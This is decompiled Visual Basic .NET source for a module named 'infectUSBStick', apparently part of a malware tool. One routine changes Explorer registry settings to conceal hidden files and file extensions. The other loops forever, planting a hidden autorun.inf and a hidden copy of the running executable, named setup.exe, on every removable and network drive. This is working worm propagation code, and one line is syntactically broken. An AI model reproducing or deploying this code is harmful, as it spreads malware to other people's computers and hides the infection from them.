Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x0200003F RID: 63
	Friend Module infectUSBStick
		' Token: 0x06000159 RID: 345 RVA: 0x0000C31C File Offset: 0x0000A51C
		Friend Sub ExplorerOptions()
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
				If registryKey.GetValue("Hidden") IsNot 2 Then
					registryKey.SetValue("Hidden", 2)
				End If
				If registryKey.GetValue("HideFileExt") IsNot 1 Then
					registryKey.SetValue("HideFileExt", 1)
				End If
			Catch
			End Try
		End Sub

		' Token: 0x0600015A RID: 346 RVA: 0x0000C3A4 File Offset: 0x0000A5A4
		Friend Sub infect()
			Try
				While True
					Dim drives As DriveInfo() = DriveInfo.GetDrives()
					For Each driveInfo As DriveInfo In drives
						If driveInfo.DriveType = DriveType.Removable OrElse driveInfo.DriveType = DriveType.Network Then
							Dim streamWriter As StreamWriter = New StreamWriter(driveInfo.Name + "autorun.inf")
							streamWriter.WriteLine("[autorun]" & vbLf)
							streamWriter.WriteLine("open=setup.exe")
							streamWriter.WriteLine("action=Run win32")
							streamWriter.Close()
							File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "\autorun.inf") Or FileAttributes.Hidden Or FileAttributes.System)
							Application.ExecutablePath + "\" + Process.GetCurrentProcess().MainModule.FileName
							File.Copy(Process.GetCurrentProcess().MainModule.FileName, driveInfo.Name + "\setup.exe", True)
							File.SetAttributes(driveInfo.Name + "\setup.exe", File.GetAttributes(driveInfo.Name + "\setup.exe") Or FileAttributes.Hidden Or FileAttributes.System)
						End If
					Next
					Thread.Sleep(10000)
				End While
			Catch ex As Exception
			End Try
		End Sub
	End Module
End Namespace
